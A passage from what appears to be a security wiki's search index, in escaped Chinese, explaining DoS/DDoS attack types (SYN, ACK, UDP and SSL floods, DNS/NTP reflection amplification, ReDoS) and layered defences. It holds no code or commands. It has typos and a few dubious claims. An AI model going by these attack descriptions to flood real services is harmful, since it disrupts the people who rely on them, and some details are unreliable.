\u7531\u4e8eUDP\u534f\u8bae\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u5728UDPFLOOD\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u53d1\u9001\u5927\u91cf\u4f2a\u9020\u6e90IP\u5730\u5740\u7684\u5c0fUDP\u5305\u3002\u4f46\u662f\uff0c\u7531\u4e8eUDP\u534f\u8bae\u662f\u65e0\u8fde\u63a5\u6027\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5f00\u4e86\u4e00\u4e2aUDP\u7684\u7aef\u53e3\u63d0\u4f9b\u76f8\u5173\u670d\u52a1\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ef\u9488\u5bf9\u76f8\u5173\u7684\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002-- \u767e\u5ea6\u767e\u79d1 \u9632\u5fa1\u6280\u5de7--\u767e\u5ea6\u767e\u79d1 \u653b\u51fb\u975e\u4e1a\u52a1\u7aef\u53e3\uff1a\u4e00\u4e2a\u662f\u4e22\u5f03\u6240\u6709UDP\u5305\uff0c\u53ef\u80fd\u4f1a\u8bef\u4f24\u6b63\u5e38\u4e1a\u52a1\uff1b\u4e00\u4e2a\u662f\u5efa\u7acbUDP\u8fde\u63a5\u89c4\u5219\uff0c\u8981\u6c42\u6240\u6709\u53bb\u5f80\u8be5\u7aef\u53e3\u7684UDP\u5305\uff0c\u5fc5\u987b\u9996\u5148\u4e0eTCP\u7aef\u53e3\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u9700\u8981\u9632\u706b\u5899\u652f\u6491\u3002 TCP-Flood TCP\u653b\u51fb\u4fd7\u79f0SYN\u6cdb\u6d2a\uff0c\u5229\u7528TCP\u4e09\u6b21\u63e1\u624b\u534f\u8bae\u6765\u653b\u51fb\u8ba1\u7b97\u673a\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u4f2a\u9020\u5927\u91cfIP\u7684\u534a\u8fde\u63a5\u53bb\u653b\u51fb\u5bf9\u65b9\u7cfb\u7edf\u3002 ICMP-Flood \u6b7b\u4ea1\u4e4bping\uff0c\u6b63\u5e38ICMP\u534f\u8bae\u6570\u636e\u5305\u4e3a96\u5b57\u8282\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u7684ICMPFlood\u901a\u5e38\u8bbe\u5b9a\u8f83\u5927\u7684\u957f\u5ea6\u3002 \u534f\u8bae\u5c42 TCP/UDP/ICMP\u5206\u7247 \u5f53\u534f\u8bae\u6808\u6536\u5230\u5206\u7247\u901a\u77e5\u65f6\uff0c\u9700\u8981\u9884\u7559\u4e00\u5b9a\u7684\u5185\u5b58\u6765\u7ec4\u88c5\u6570\u636e\u5305\uff0c\u653b\u51fb\u8005\u6076\u610f\u4f7f\u7528\u5206\u7247\u529f\u80fd\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u670d\u52a1\u7aef\u7684\u534f\u8bae\u6808\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 SYN-Flood \u6b63\u5e38\u6d41\u7a0b\uff1a\u5ba2\u6237\u7aef\u53d1\u9001SYC\uff0c\u670d\u52a1\u7aef\u54cd\u5e94SYN+ACK\uff0c\u5ba2\u6237\u7aef\u56de\u4f20ACK+1\u3002 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020\u4e0d\u5b58\u5728\u7684IP\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u4e0d\u5230ACK+1\uff0c\u4f1a\u6301\u7eed\u53d1\u9001SYN+ACK\uff0c\u540c\u65f6\u4fdd\u6301\u7740\u672a\u5b8c\u6210\u7684\u8fde\u63a5\uff0c\u8fd9\u6837\u5bb9\u6613\u5360\u6ee1\u670d\u52a1\u5668\u7684\u8fde\u63a5\u961f\u5217\u8fbe\u5230\u6548\u679c\u3002 ACK-Flood \u4e0eSYN-Flood\u653b\u51fb\u7c7b\u4f3c\uff0c\u653b\u51fb\u8005\u53d1\u9001ACK\u5305\uff0c\u5982\u679c\u76ee\u6807\u7cfb\u7edf\u5141\u8bb8ACK\u6765\u5efa\u7acb\u8fde\u63a5\u5c31\u5f88\u5bb9\u6613\u5bfc\u81f4\u8fde\u63a5\u8868\u9879\u8d44\u6e90\u8017\u5c3d\uff0c\u540c\u65f6\u534f\u8bae\u6808\u8fd8\u4f1a\u53d1\u73b0\u8fd9\u7c7b\u6570\u636e\u5305\u4e0d\u5408\u6cd5\u548c\u54cd\u5e94reset\u5305\uff0c\u5bfc\u81f4\u7cfb\u7edf\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 zeroWindow \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u6570\u636e\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u51c6\u5907\u597d\u6570\u636e\u65f6\uff0c\u653b\u51fb\u8005\u53d1\u9001ack\u5305\u6307\u5b9awindow\u5927\u5c0f\u4e3a0\uff0c\u8fd9\u662f\u670d\u52a1\u7aef\u65e0\u6cd5\u53d1\u9001\u6570\u636e\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u901a\u8fc7\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\u6765\u6d88\u8017\u670d\u52a1\u7aef\u8d44\u6e90\u3002 Connection-Flood \u4ec5\u5efa\u7acb\u8fde\u63a5\u4e0d\u53d1\u9001\u6570\u636e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7b49\u5f85\u8d85\u65f6\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\uff0c\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 SSL-Flood \u4e0d\u65ad\u7684\u53d1\u8d77SSL\u63e1\u624b\uff0cSSL\u63e1\u624b\u8fc7\u7a0b\uff0c\u670d\u52a1\u7aef\u6d88\u8017\u7684\u8d44\u6e90\u662f\u5ba2\u6237\u7aef\u768415\u500d\u3002 SSLKeyRenego \u5728\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\u7684\u65f6\u5019\u670d\u52a1\u7aefCPU\u7684\u6d88\u8017\u662f\u5ba2\u6237\u7aef\u768415\u500d\u5de6\u53f3\uff0c\u800cRenegotiating\u673a\u5236\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u5728\u4e00\u4e2aTCP\u8fde\u63a5\u4e2d\u4e0d\u65ad\u8fdb\u884c\u91cd\u65b0\u534f\u5546\uff0c\u5bfc\u81f4\u670d\u52a1\u7aefCPU\u8d44\u6e90\u8017\u5c3d\u3002 \u9632\u5fa1\u6280\u5de7\uff1a\u7981\u7528Renegotiating\u673a\u5236\u6765\u5b9e\u73b0\u9632\u5fa1 \u53cd\u5c04\u653e\u5927\u653b\u51fb \u53cd\u5c04\uff1a\u65e0\u8bbaDNS\u8fd8\u662fNTP\uff0c\u90fd\u662f\u57fa\u4e8eUDP\u534f\u8bae\u7684\uff0c\u5728UDP\u534f\u8bae\u4e2d\u6b63\u5e38\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u54cd\u5e94\u5305\u5230\u5ba2\u6237\u7aef\uff0c\u4f46\u662fUDP\u534f\u8bae\u662f\u9762\u5411\u65e0\u8fde\u63a5\u7684\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u7684\u6e90IP\u5f88\u5bb9\u6613\u8fdb\u884c\u4f2a\u9020\uff0c\u5f53\u628a\u6e90IP\u4fee\u6539\u4e3a\u53d7\u5bb3\u8005\u7684IP\uff0c\u6700\u7ec8\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u54cd\u5e94\u5305\u5c31\u4f1a\u8fd4\u56de\u5230\u53d7\u5bb3\u8005\u7684IP\uff0c\u8fd9\u6837\u5c31\u5f62\u6210\u4e86\u53cd\u5c04\u653b\u51fb\u3002 \u653e\u5927\uff1a\u4e00\u4e2a\u5c0f\u7684\u8bf7\u6c42\u5305\u6700\u7ec8\u4f1a\u53d7\u5230\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u591a\u4e8e\u8bf7\u6c42\u5305\u8bb8\u591a\u500d\u7684\u54cd\u5e94\u5305\uff0c\u8fd9\u6837\u5c31\u8fbe\u5230\u4e86\u56db\u4e24\u62e8\u5343\u65a4\u7684\u6548\u679c\u3002 DNS\u53cd\u5c04 \u5229\u7528\u4e92\u8054\u7f51\u4e0a\u5f00\u653e\u7684DNS\u5730\u67dc\u670d\u52a1\u5668\u4f5c\u4e3a\u653b\u51fb\u6e90\uff0c\u5229\u7528\"\u53cd\u5f39\"\u624b\u6cd5\u653b\u51fb\u76ee\u6807\u673a\u5668\u3002 \u6b63\u5e38\u6d41\u7a0b\uff1a\u6e90IP\u5730\u5740--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u6e90IP\u5730\u5740 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020IP\u5730\u5740(\u53d7\u5bb3\u8005IP)--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u4f2a\u9020\u7684IP\u5730\u5740(\u653b\u51fb\u76ee\u6807) NTP\u53cd\u5c04 NTP\u5305\u542b\u4e00\u4e2amonlist\u529f\u80fd\uff0c\u4e5f\u88ab\u79f0\u4e3aMON_GETLIST\uff0c\u4e3b\u8981\u7528\u4e8e\u76d1\u63a7NTP\u670d\u52a1\u5668\uff0cNTP\u670d\u52a1\u5668\u54cd\u5e94monlist\u540e\u6094\u8fd4\u56de\u4e0eNTP\u670d\u52a1\u5668\u8fdb\u884c\u8fc7\u65f6\u95f4\u540c\u6b65\u7684\u6700\u540e600\u4e2a\u5ba2\u6237\u7aefIP\uff0c\u54cd\u5e94\u5305\u6309\u7167\u6bcf6\u4e2aIP\u8fdb\u884c\u5206\u5272\uff0c\u6700\u591a\u6709100\u4e2a\u54cd\u5e94\u5305\u3002 SNMP\u53cd\u5c04 SSDP\u53cd\u5c04 Chargen\u53cd\u5c04 DRDoS DRDoS(Distributed Reflection Denial of Service)\uff0c\u5206\u5e03\u5f0f\u53cd\u5c04\u653b\u51fb\uff1a ReDoS ReDoS(Regular Expression Denial of Service)\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff1a\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u6709\u6548\u6027\u6821\u9a8c\uff0c\u5f53\u7f16\u5199\u6821\u9a8c\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5b58\u5728\u7f3a\u9677\u6216\u8005\u4e0d\u4e25\u8c28\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u6765\u5927\u91cf\u6d88\u8017\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u9020\u6210\u670d\u52a1\u5668\u7684\u670d\u52a1\u7ec8\u7aef\u6216\u505c\u6b62\u3002 \u65e0\u7ebfDDoS DoS\u4e0eDDoS\u9632\u5fa1 \u7f51\u7edc\u5c42\u9762\u7684DDoS\u653b\u51fb\u662f\u65e0\u6cd5\u9632\u5fa1\u7684\uff0c\u80fd\u505a\u7684\u5c31\u662f\u4e0d\u65ad\u4f18\u5316\u81ea\u8eab\u7684\u7f51\u7edc\u67b6\u6784\uff0c\u4ee5\u53ca\u63d0\u5347\u7f51\u7edc\u5e26\u5bbd \u589e\u52a0\u94fe\u8def\u5e26\u5bbd ISP/WAN\u5c42 \u6d41\u91cf\u538b\u5236 \u5206\u65b9\u5411\u7684\u9ed1\u6d1e\u8def\u7531 \u8fd1\u6e90\u6e05\u6d17 CDN/Internet\u5c42 CDN\u672c\u8eab\u4e0d\u662f\u6297DDoS\u4ea7\u54c1\uff0c\u4f46\u662f\u9488\u5bf9Web\u670d\u52a1\uff0cCDN\u80fd\u63d0\u4f9b\u4e00\u5b9a\u7684\u6297D\u6548\u679c\u3002 DC\u5c42 DataCenter\u8fd9\u4e00\u5c42\u7684\u9632\u5fa1\u5c5e\u4e8e\u8fd1\u76ee\u7684\u6e05\u6d17\uff0c\u5728DC\u51fa\u53e3\u7684\u5730\u65b9\u90e8\u7f72ADS\u8bbe\u5907\u3002 OS/APP\u66fe \u5e94\u7528\u5c42\u7684\u9632\u5fa1\u624b\u6bb5\u3002","title":"DoS\u4e0eDDoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"network_security/dos_ddos/#dosddos","text":"DoS(Denial of Service)\uff0c\u62d2\u7edd\u670d\u52a1\uff1a\u901a\u8fc7\u5bf9\u4e3b\u673a\u7279\u5b9a\u6f0f\u6d1e\u7684\u5229\u7528\u653b\u51fb\u5bfc\u81f4\u7f51\u7edc\u6808\u5931\u6548\u3001\u7cfb\u7edf\u5954\u6e83\u3001\u4e3b\u673a\u6b7b\u673a\u7b49\u800c\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u7684\u7f51\u7edc\u670d\u52a1\u529f\u80fd\uff0c\u4ece\u800c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002 DDoS(Distributed Denial of Service)\uff0c\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff1a\u901a\u8fc7\u5f88\u591a\"\u50f5\u5c38\u4e3b\u673a\"\u5411\u53d7\u5bb3\u4e3b\u673a\u53d1\u9001\u5927\u91cf\u770b\u4f3c\u6b63\u5e38\u7684\u7f51\u7edc\u5305\uff0c\u4ece\u800c\u9020\u6210\u7f51\u7edc\u963b\u585e\u6216\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\u800c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002","title":"DoS\u4e0eDDoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"network_security/dos_ddos/#dosddos_1","text":"","title":"DoS\u4e0eDDoS\u5206\u7c7b"},{"location":"network_security/dos_ddos/#_1","text":"","title":"\u7f51\u7edc\u5c42"},{"location":"network_security/dos_ddos/#udp-flood","text":"\u7531\u4e8eUDP\u534f\u8bae\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u5728UDPFLOOD\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u53d1\u9001\u5927\u91cf\u4f2a\u9020\u6e90IP\u5730\u5740\u7684\u5c0fUDP\u5305\u3002\u4f46\u662f\uff0c\u7531\u4e8eUDP\u534f\u8bae\u662f\u65e0\u8fde\u63a5\u6027\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5f00\u4e86\u4e00\u4e2aUDP\u7684\u7aef\u53e3\u63d0\u4f9b\u76f8\u5173\u670d\u52a1\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ef\u9488\u5bf9\u76f8\u5173\u7684\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002-- \u767e\u5ea6\u767e\u79d1 \u9632\u5fa1\u6280\u5de7--\u767e\u5ea6\u767e\u79d1 \u653b\u51fb\u975e\u4e1a\u52a1\u7aef\u53e3\uff1a\u4e00\u4e2a\u662f\u4e22\u5f03\u6240\u6709UDP\u5305\uff0c\u53ef\u80fd\u4f1a\u8bef\u4f24\u6b63\u5e38\u4e1a\u52a1\uff1b\u4e00\u4e2a\u662f\u5efa\u7acbUDP\u8fde\u63a5\u89c4\u5219\uff0c\u8981\u6c42\u6240\u6709\u53bb\u5f80\u8be5\u7aef\u53e3\u7684UDP\u5305\uff0c\u5fc5\u987b\u9996\u5148\u4e0eTCP\u7aef\u53e3\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u9700\u8981\u9632\u706b\u5899\u652f\u6491\u3002","title":"UDP-Flood"},{"location":"network_security/dos_ddos/#tcp-flood","text":"TCP\u653b\u51fb\u4fd7\u79f0SYN\u6cdb\u6d2a\uff0c\u5229\u7528TCP\u4e09\u6b21\u63e1\u624b\u534f\u8bae\u6765\u653b\u51fb\u8ba1\u7b97\u673a\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u4f2a\u9020\u5927\u91cfIP\u7684\u534a\u8fde\u63a5\u53bb\u653b\u51fb\u5bf9\u65b9\u7cfb\u7edf\u3002","title":"TCP-Flood"},{"location":"network_security/dos_ddos/#icmp-flood","text":"\u6b7b\u4ea1\u4e4bping\uff0c\u6b63\u5e38ICMP\u534f\u8bae\u6570\u636e\u5305\u4e3a96\u5b57\u8282\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u7684ICMPFlood\u901a\u5e38\u8bbe\u5b9a\u8f83\u5927\u7684\u957f\u5ea6\u3002","title":"ICMP-Flood"},{"location":"network_security/dos_ddos/#_2","text":"","title":"\u534f\u8bae\u5c42"},{"location":"network_security/dos_ddos/#tcpudpicmp","text":"\u5f53\u534f\u8bae\u6808\u6536\u5230\u5206\u7247\u901a\u77e5\u65f6\uff0c\u9700\u8981\u9884\u7559\u4e00\u5b9a\u7684\u5185\u5b58\u6765\u7ec4\u88c5\u6570\u636e\u5305\uff0c\u653b\u51fb\u8005\u6076\u610f\u4f7f\u7528\u5206\u7247\u529f\u80fd\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u670d\u52a1\u7aef\u7684\u534f\u8bae\u6808\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002","title":"TCP/UDP/ICMP\u5206\u7247"},{"location":"network_security/dos_ddos/#syn-flood","text":"\u6b63\u5e38\u6d41\u7a0b\uff1a\u5ba2\u6237\u7aef\u53d1\u9001SYC\uff0c\u670d\u52a1\u7aef\u54cd\u5e94SYN+ACK\uff0c\u5ba2\u6237\u7aef\u56de\u4f20ACK+1\u3002 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020\u4e0d\u5b58\u5728\u7684IP\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u4e0d\u5230ACK+1\uff0c\u4f1a\u6301\u7eed\u53d1\u9001SYN+ACK\uff0c\u540c\u65f6\u4fdd\u6301\u7740\u672a\u5b8c\u6210\u7684\u8fde\u63a5\uff0c\u8fd9\u6837\u5bb9\u6613\u5360\u6ee1\u670d\u52a1\u5668\u7684\u8fde\u63a5\u961f\u5217\u8fbe\u5230\u6548\u679c\u3002","title":"SYN-Flood"},{"location":"network_security/dos_ddos/#ack-flood","text":"\u4e0eSYN-Flood\u653b\u51fb\u7c7b\u4f3c\uff0c\u653b\u51fb\u8005\u53d1\u9001ACK\u5305\uff0c\u5982\u679c\u76ee\u6807\u7cfb\u7edf\u5141\u8bb8ACK\u6765\u5efa\u7acb\u8fde\u63a5\u5c31\u5f88\u5bb9\u6613\u5bfc\u81f4\u8fde\u63a5\u8868\u9879\u8d44\u6e90\u8017\u5c3d\uff0c\u540c\u65f6\u534f\u8bae\u6808\u8fd8\u4f1a\u53d1\u73b0\u8fd9\u7c7b\u6570\u636e\u5305\u4e0d\u5408\u6cd5\u548c\u54cd\u5e94reset\u5305\uff0c\u5bfc\u81f4\u7cfb\u7edf\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002","title":"ACK-Flood"},{"location":"network_security/dos_ddos/#zerowindow","text":"\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u6570\u636e\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u51c6\u5907\u597d\u6570\u636e\u65f6\uff0c\u653b\u51fb\u8005\u53d1\u9001ack\u5305\u6307\u5b9awindow\u5927\u5c0f\u4e3a0\uff0c\u8fd9\u662f\u670d\u52a1\u7aef\u65e0\u6cd5\u53d1\u9001\u6570\u636e\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u901a\u8fc7\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\u6765\u6d88\u8017\u670d\u52a1\u7aef\u8d44\u6e90\u3002","title":"zeroWindow"},{"location":"network_security/dos_ddos/#connection-flood","text":"\u4ec5\u5efa\u7acb\u8fde\u63a5\u4e0d\u53d1\u9001\u6570\u636e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7b49\u5f85\u8d85\u65f6\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\uff0c\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002","title":"Connection-Flood"},{"location":"network_security/dos_ddos/#ssl-flood","text":"\u4e0d\u65ad\u7684\u53d1\u8d77SSL\u63e1\u624b\uff0cSSL\u63e1\u624b\u8fc7\u7a0b\uff0c\u670d\u52a1\u7aef\u6d88\u8017\u7684\u8d44\u6e90\u662f\u5ba2\u6237\u7aef\u768415\u500d\u3002","title":"SSL-Flood"},{"location":"network_security/dos_ddos/#sslkeyrenego","text":"\u5728\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\u7684\u65f6\u5019\u670d\u52a1\u7aefCPU\u7684\u6d88\u8017\u662f\u5ba2\u6237\u7aef\u768415\u500d\u5de6\u53f3\uff0c\u800cRenegotiating\u673a\u5236\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u5728\u4e00\u4e2aTCP\u8fde\u63a5\u4e2d\u4e0d\u65ad\u8fdb\u884c\u91cd\u65b0\u534f\u5546\uff0c\u5bfc\u81f4\u670d\u52a1\u7aefCPU\u8d44\u6e90\u8017\u5c3d\u3002 \u9632\u5fa1\u6280\u5de7\uff1a\u7981\u7528Renegotiating\u673a\u5236\u6765\u5b9e\u73b0\u9632\u5fa1","title":"SSLKeyRenego"},{"location":"network_security/dos_ddos/#_3","text":"\u53cd\u5c04\uff1a\u65e0\u8bbaDNS\u8fd8\u662fNTP\uff0c\u90fd\u662f\u57fa\u4e8eUDP\u534f\u8bae\u7684\uff0c\u5728UDP\u534f\u8bae\u4e2d\u6b63\u5e38\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u54cd\u5e94\u5305\u5230\u5ba2\u6237\u7aef\uff0c\u4f46\u662fUDP\u534f\u8bae\u662f\u9762\u5411\u65e0\u8fde\u63a5\u7684\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u7684\u6e90IP\u5f88\u5bb9\u6613\u8fdb\u884c\u4f2a\u9020\uff0c\u5f53\u628a\u6e90IP\u4fee\u6539\u4e3a\u53d7\u5bb3\u8005\u7684IP\uff0c\u6700\u7ec8\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u54cd\u5e94\u5305\u5c31\u4f1a\u8fd4\u56de\u5230\u53d7\u5bb3\u8005\u7684IP\uff0c\u8fd9\u6837\u5c31\u5f62\u6210\u4e86\u53cd\u5c04\u653b\u51fb\u3002 \u653e\u5927\uff1a\u4e00\u4e2a\u5c0f\u7684\u8bf7\u6c42\u5305\u6700\u7ec8\u4f1a\u53d7\u5230\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u591a\u4e8e\u8bf7\u6c42\u5305\u8bb8\u591a\u500d\u7684\u54cd\u5e94\u5305\uff0c\u8fd9\u6837\u5c31\u8fbe\u5230\u4e86\u56db\u4e24\u62e8\u5343\u65a4\u7684\u6548\u679c\u3002","title":"\u53cd\u5c04\u653e\u5927\u653b\u51fb"},{"location":"network_security/dos_ddos/#dns","text":"\u5229\u7528\u4e92\u8054\u7f51\u4e0a\u5f00\u653e\u7684DNS\u5730\u67dc\u670d\u52a1\u5668\u4f5c\u4e3a\u653b\u51fb\u6e90\uff0c\u5229\u7528\"\u53cd\u5f39\"\u624b\u6cd5\u653b\u51fb\u76ee\u6807\u673a\u5668\u3002 \u6b63\u5e38\u6d41\u7a0b\uff1a\u6e90IP\u5730\u5740--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u6e90IP\u5730\u5740 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020IP\u5730\u5740(\u53d7\u5bb3\u8005IP)--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u4f2a\u9020\u7684IP\u5730\u5740(\u653b\u51fb\u76ee\u6807)","title":"DNS\u53cd\u5c04"},{"location":"network_security/dos_ddos/#ntp","text":"NTP\u5305\u542b\u4e00\u4e2amonlist\u529f\u80fd\uff0c\u4e5f\u88ab\u79f0\u4e3aMON_GETLIST\uff0c\u4e3b\u8981\u7528\u4e8e\u76d1\u63a7NTP\u670d\u52a1\u5668\uff0cNTP\u670d\u52a1\u5668\u54cd\u5e94monlist\u540e\u6094\u8fd4\u56de\u4e0eNTP\u670d\u52a1\u5668\u8fdb\u884c\u8fc7\u65f6\u95f4\u540c\u6b65\u7684\u6700\u540e600\u4e2a\u5ba2\u6237\u7aefIP\uff0c\u54cd\u5e94\u5305\u6309\u7167\u6bcf6\u4e2aIP\u8fdb\u884c\u5206\u5272\uff0c\u6700\u591a\u6709100\u4e2a\u54cd\u5e94\u5305\u3002","title":"NTP\u53cd\u5c04"},{"location":"network_security/dos_ddos/#snmp","text":"","title":"SNMP\u53cd\u5c04"},{"location":"network_security/dos_ddos/#ssdp","text":"","title":"SSDP\u53cd\u5c04"},{"location":"network_security/dos_ddos/#chargen","text":"","title":"Chargen\u53cd\u5c04"},{"location":"network_security/dos_ddos/#drdos","text":"DRDoS(Distributed Reflection Denial of Service)\uff0c\u5206\u5e03\u5f0f\u53cd\u5c04\u653b\u51fb\uff1a","title":"DRDoS"},{"location":"network_security/dos_ddos/#redos","text":"ReDoS(Regular Expression Denial of Service)\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff1a\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u6709\u6548\u6027\u6821\u9a8c\uff0c\u5f53\u7f16\u5199\u6821\u9a8c\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5b58\u5728\u7f3a\u9677\u6216\u8005\u4e0d\u4e25\u8c28\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u6765\u5927\u91cf\u6d88\u8017\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u9020\u6210\u670d\u52a1\u5668\u7684\u670d\u52a1\u7ec8\u7aef\u6216\u505c\u6b62\u3002","title":"ReDoS"},{"location":"network_security/dos_ddos/#ddos","text":"","title":"\u65e0\u7ebfDDoS"},{"location":"network_security/dos_ddos/#dosddos_2","text":"\u7f51\u7edc\u5c42\u9762\u7684DDoS\u653b\u51fb\u662f\u65e0\u6cd5\u9632\u5fa1\u7684\uff0c\u80fd\u505a\u7684\u5c31\u662f\u4e0d\u65ad\u4f18\u5316\u81ea\u8eab\u7684\u7f51\u7edc\u67b6\u6784\uff0c\u4ee5\u53ca\u63d0\u5347\u7f51\u7edc\u5e26\u5bbd","title":"DoS\u4e0eDDoS\u9632\u5fa1"},{"location":"network_security/dos_ddos/#_4","text":"","title":"\u589e\u52a0\u94fe\u8def\u5e26\u5bbd"},{"location":"network_security/dos_ddos/#ispwan","text":"","title":"ISP/WAN\u5c42"},{"location":"network_security/dos_ddos/#_5","text":"\u5206\u65b9\u5411\u7684\u9ed1\u6d1e\u8def\u7531","title":"\u6d41\u91cf\u538b\u5236"},{"location":"network_security/dos_ddos/#_6","text":"","title":"\u8fd1\u6e90\u6e05\u6d17"},{"location":"network_security/dos_ddos/#cdninternet","text":"CDN\u672c\u8eab\u4e0d\u662f\u6297DDoS\u4ea7\u54c1\uff0c\u4f46\u662f\u9488\u5bf9Web\u670d\u52a1\uff0cCDN\u80fd\u63d0\u4f9b\u4e00\u5b9a\u7684\u6297D\u6548\u679c\u3002","title":"CDN/Internet\u5c42"},{"location":"network_security/dos_ddos/#dc","text":"DataCenter\u8fd9\u4e00\u5c42\u7684\u9632\u5fa1\u5c5e\u4e8e\u8fd1\u76ee\u7684\u6e05\u6d17\uff0c\u5728DC\u51fa\u53e3\u7684\u5730\u65b9\u90e8\u7f72ADS\u8bbe\u5907\u3002","title":"DC\u5c42"},{"location":"network_security/dos_ddos/#osapp","text":"\u5e94\u7528\u5c42\u7684\u9632\u5fa1\u624b\u6bb5\u3002","title":"OS/APP\u66fe"},{"location":"other-security-branch/asset-management/","text":"\u8d44\u4ea7\u7ba1\u7406 